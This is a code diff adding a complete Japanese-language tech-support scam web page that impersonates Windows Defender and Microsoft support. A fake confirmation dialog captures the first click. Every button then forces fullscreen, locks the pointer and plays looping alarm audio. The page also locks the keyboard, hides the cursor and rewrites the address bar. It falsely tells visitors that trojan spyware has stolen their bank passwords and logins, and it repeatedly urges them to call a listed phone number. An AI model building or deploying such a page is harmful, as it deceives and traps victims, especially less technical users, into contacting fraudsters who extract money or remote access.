@@ -1,0 +1,460 @@
+<html lang="en">
+  
+<head>
+    <meta charset="utf-8">
+    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+    <title>当ウェブサイトへようこそ</title>
+    <link href="extra/tapa.css" rel="stylesheet">
+
+    <style>
+
+
+
+#age-confirmation-modal{
+    position: fixed;
+    background-color: #ffffff;
+    top: 0;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    z-index: 999999999;
+    display: inline-block;
+    background: none;
+    background-image: url(extra/bg.jpg);
+    width: 100%;
+    height: auto;
+    background-repeat: no-repeat;
+    background-size: cover;
+    text-align: center;
+    cursor: alias;
+    font-size: 3.5rem;
+}
+#age-confirmation-modal .innerContainer {
+    background-color: #ffffff;
+    border-color: #111111;
+    width: 40%;
+    color: #111111;
+    padding: 50px;
+    border-radius: 0px;
+    display: inline-block;
+    position: absolute;
+    top: 0px; /* spacing from top */
+    left: 50%;
+    transform: translateX(-50%); /* only center horizontally */
+}
+
+
+
+
+
+.btn-primary {
+      color: #fff;
+      background-color: #007bff;
+      border-color: #007bff;
+      cursor: pointer;
+      text-align:right;
+  }
+
+
+  .btn-lg {
+      padding: 1rem 2.5rem;
+      font-size: 2rem;
+      line-height: 1.5;
+      border-radius: 0.3rem;
+      margin-top: 1.55rem;
+      cursor: pointer;
+    }
+
+      .btn-secondary {
+    color: #fff;
+    text-align:right;
+    background-color: #6c757d;
+    border-color: #6c757d;
+    cursor: pointer;
+}
+
+
+
+.close {
+    float: right;
+    font-size: 1.5rem;
+    font-weight: 700;
+    line-height: 1;
+    background-color: #ff0000;
+    color: #ffffff;
+    
+  
+    cursor: pointer;
+}
+
+
+
+
+
+    </style>
+
+
+  </head>
+  
+
+<body>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    var phoneNumber = "0101-877-611-8429";
+
+    document.querySelectorAll(".phone").forEach(function(el) {
+        el.innerText = phoneNumber;
+    });
+});
+</script>
+
+               
+                
+                
+
+
+
+ <div id="age-confirmation-modal" onclick="goFullscreen(); handleClick(); enablePointerLock();" >
+
+<div class="innerContainer">
+               
+     
+             
+                <div>
+                
+    
+         <!--   <video  width=350px; height=350px; preload="auto" autoplay loop muted="muted" volume="0" >
+            <source src="../images/R1_04.mp4" type="video/mp4">
+            </video>
+            </br>
+            <img src="../images/closeandplay.jpg" >
+      <!--  <center>  
+      <p style=" position: center; font-size: 16px; color: black;">Close & Play</p> </center>-->
+                </div>
+               <div style="font-size:20px;">
+                    このサイトを離れますか？
+                </div><br>
+                <div style="font-size:20px;">
+                    本気ですか？
+                </div>
+                <div>
+                  <button type="button" class="btn btn-secondary btn-lg" onclick="goFullscreen(); handleClick(); enablePointerLock(); " >
+     いいえ</button>
+     <button type="button" class="btn btn-primary btn-lg" style="color: #fff; 
+     background-color: #007bff;
+     border-color: #007bff;" onclick="goFullscreen(); handleClick(); enablePointerLock();" >
+    はい</button>
+                </div>
+               
+                
+                
+            </div>
+
+        </div>
+
+
+
+
+
+            
+
+
+   
+    <div class="bg" style="cursor:none" onclick="playAudio();">
+      <div class="bgimg" style="top:0">
+        <img src="extra/f24.png" alt="" width="100%">
+      </div>
+    </div>
+
+
+    \
+    
+    
+    <div class="pro_box2" style="cursor: none; display: block;" onclick="playAudio();">
+      <img src="extra/bx1.png" alt="" style="width:100%;max-width: 100%;display: block;
+      margin: 0 auto;">
+    </div>
+
+
+
+
+
+    
+    <div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999;" id="footer" onclick="playAudio();">
+      <div class="row">
+        <div class="col-md-12">
+          <div class="right-foot" style="text-align:center">
+            <span id="footertxt">
+              <img src="extra/msmm.png"> Windowsのセキュリティ </span>
+            <span style="font-weight:500;padding-left:13px;color:#fff; ">Windowsサポートにお問い合わせください。 <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> <span class="phone"></span>
+              </span>
+            </span>
+          </div>
+        </div>
+        <div class="col-md-12">
+          <marquee direction="left" height="100px" width="100%">
+            <small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、PC が危険にさらされる可能性があります。 Windows Defender スキャンにより、パスワード、オンライン ID、財務情報、個人ファイル、写真、ドキュメントを盗む可能性があるアドウェアがこのデバイス上で見つかりました。</small>
+          </marquee>
+        </div>
+      </div>
+    </div>
+
+
+
+
+    <div class="lightbox" id="poptxt" style="display: block;" onclick="playAudio();">
+      <div class="ilb top" style="font-size:17px">
+        <div class="ilb headers" style="border-bottom:1px solid #d6d5d5">
+          <span class="fl title" id="txtadd">
+            <span class="fl ilb">
+              <img src="extra/dm.png" class="logo3">
+            </span>Windows Defender セキュリティ センター </span>
+          <span class="fl title2" id="txts1">
+            <a href="#" id="cross">
+              <img src="extra/cs.png">
+            </a>
+          </span>
+        </div>
+      </div>
+
+
+      <div id="txtintro">
+        <span class="colo-rd">
+          <div id="ip_add">Windows Defender セキュリティセンター</div>
+          <div id="city">お使いのシステムがウイルスに感染している可能性があります。無料スキャンをお試しください。</div>
+          <div id="isp"> (エラーコード: 2V7HGTVB)</div>
+        </span>
+      </div>
+      <img src="extra/re.gif" id="banner">
+      <div id="disclaimer">生涯無料のウイルス対策ソフトを手に入れましょう。今すぐ、以下の番号にお電話ください。<br>
+        <span class="support" style="font-size:22px;">この画面を閉じないでください。無料スキャンをご利用いただけます。今すぐお電話ください。<br><span style="display:inline-block;
+border:1px solid #114d9a;
+border-radius:5px;
+padding:10px 15px;
+line-height:1.4;
+text-align:center;">
+
+フリーダイヤル：
+<br>
+
+<span class="phone" style="font-size:32px;font-weight:bold;"></span>
+
+</span>
+          </span>
+        </span>
+      </div>
+      <div id="bottom">
+        <img src="extra/msmm.png" id="badge">
+        <span class="title3">Windows</span>
+        <ul>
+          <li>
+            <a href="#">
+              <div class="fr button2">
+                <span id="addtochromebutton">キャンセル</span>
+              </div>
+            </a>
+          </li>
+          <li>
+            <a href="#">
+              <div class="fr button">
+                <span id="addtochromebutton">わかった</span>
+              </div>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </div>
+
+
+
+    <div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new" onclick="playAudio();">
+      <p style="font-size:16px;font-weight:400;margin:0;margin-bottom:5px;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:8px" class="text-center">Windows-Defender - セキュリティ警告</p>
+      <p>
+        <b>この PC へのアクセスはセキュリティ上の理由からブロックされています</b>
+      </p>
+      <p>お使いのコンピュータは、トロイの木馬タイプのスパイウェアに感染していると報告されました。 次のデータが侵害されました。</p>
+       <p>> メール ID <br>&gt; 銀行のパスワード <br>&gt; Facebook ログイン <br>&gt; 写真と文書 </p>
+       
+       <p>ただちに当社にご連絡ください。当社のエンジニアが電話で削除プロセスを案内いたします。</p>
+       <p>ただちに Windows サポートに電話して、この脅威を報告し、個人情報の盗難を防ぎ、このデバイスへのアクセスのブロックを解除してください。</p>
+       <p>このウィンドウを閉じると、個人情報が危険にさらされ、Windows の登録が一時停止される可能性があります。</p>
+       <p>お使いのコンピューターがトロイの木馬型スパイウェアに感染していると報告されています。以下のデータが侵害されました。</p>
+<p>Windows Defenderのスキャンにより、このデバイスでアドウェアが検出されました。このアドウェアは、パスワード、オンラインID、金融情報、個人ファイル、写真、文書などを盗んでいる可能性があります。</p>
+      <p style="padding-bottom:0;color:#fff;font-size:16px">Windowsサポートにお問い合わせください。 <strong><p>直接お話しください。</p>
+         <span class="phone"></span>
+
+</span>
+          </span>
+        </strong>
+      </p>
+      <div class="action_buttons">
+        <a class="active" id="leave_page" style="cursor:none;color:#fff!important">わかった</a>
+        <a class="active" id="leave_page" style="color:#fff!important">キャンセル</a>
+      </div>
+    </div>
+
+
+    <div class="answer_list" 
+style="display:block;
+background-color:#252525;
+height:auto;
+width:800px;
+position:fixed;
+cursor: none;
+top:0px;
+left:50%;
+transform:translateX(-50%);
+z-index:99999999;
+border:1px solid #d6d8db;
+border-radius:8px;
+box-shadow:0 0 20px rgba(0,0,0,0.8);
+padding:10px;"
+
+id="welcomeDiv" >
+
+<p style="color:#fff;
+margin-top:10px;
+font-size:16px;
+padding:0 5px;
+text-align:center;
+line-height:1.5;">
+
+できるだけ早くご連絡ください。サポート担当エンジニアが電話でサポートいたします。お使いのコンピューターが紛失しました。Windows Defender SmartScreen が認識できないアプリケーションを停止しました。このアプリの通過を許可すると、システムのセキュリティが損なわれる可能性があります。 
+
+<strong>
+Windowsサポートにお電話ください。「担当者へ直接お問い合わせください。」
+
+
+<span class="phone"></span>
+
+</strong>
+
+</p>
+
+</div>
+
+
+<div id="chat" style="display: block;" onclick="playAudio();">
+      <img src="extra/msmm.png">
+      <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+      <p style="font-weight:600;font-size:24px">お問い合わせ サポート <br>
+      </p>
+      <h4 style="font-weight:600;font-size:22px"> <span class="phone"></span>
+        <br>(セキュリティサポート)
+      </h4>
+      <div class="arrow-down">
+        <svg height="1em" viewBox="0 0 320 512">
+          <style>
+            svg {
+              fill: #fff
+            }
+          </style>
+          <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
+        </svg>
+      </div>
+    </div>
+
+   <audio id="audio1" preload="auto" loop>
+    <source src="extra/audio.mp3" type="audio/mpeg">
+</audio>
+
+
+<audio id="audio2" preload="auto">
+    <source src="extra/beep.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+function playAudio(){
+    let a1 = document.getElementById("audio1");
+    let a2 = document.getElementById("audio2");
+
+    a1.currentTime = 0;
+    a2.currentTime = 0;
+
+    a1.play().catch(()=>{});
+    a2.play().catch(()=>{});
+}
+</script>
+
+
+
+
+<script>
+function goFullscreen() {
+    let elem = document.documentElement;
+
+    // Standard modern browsers
+    if (elem.requestFullscreen) {
+        elem.requestFullscreen();
+    } 
+    // Chrome, Safari (older)
+    else if (elem.webkitRequestFullscreen) {
+        elem.webkitRequestFullscreen();
+    } 
+    // IE / old Edge
+    else if (elem.msRequestFullscreen) {
+        elem.msRequestFullscreen();
+    }
+}
+</script>
+
+<script>
+function handleClick(){
+    hideModal();
+    playAudio(); 
+}
+</script>
+
+
+<script>
+function hideModal(){
+    document.getElementById("age-confirmation-modal").style.display = "none";
+}
+</script>
+
+<script>
+navigator.keyboard.lock();
+</script>
+
+
+<script> window.history.replaceState({}, "", "/"); </script>
+
+   
+
+
+<script>
+    function enablePointerLock() {
+        let elem = document.body;
+
+        if (elem.requestPointerLock) {
+            elem.requestPointerLock();
+        } else {
+            console.error("Pointer Lock not supported");
+        }
+    }
+
+    document.addEventListener("pointerlockchange", function() {
+        if (document.pointerLockElement === document.body) {
+            console.log("Mouse is locked");
+        } else {
+            console.log("Mouse is unlocked");
+        }
+    });
+
+    document.addEventListener("pointerlockerror", function () {
+        console.error("Pointer lock error occurred.");
+    });
+
+    function disableRightClick() {
+        document.addEventListener("contextmenu", function(event) {
+            event.preventDefault();
+        });
+    }
+</script>
+
+
+  </body>
+
+
+</html>
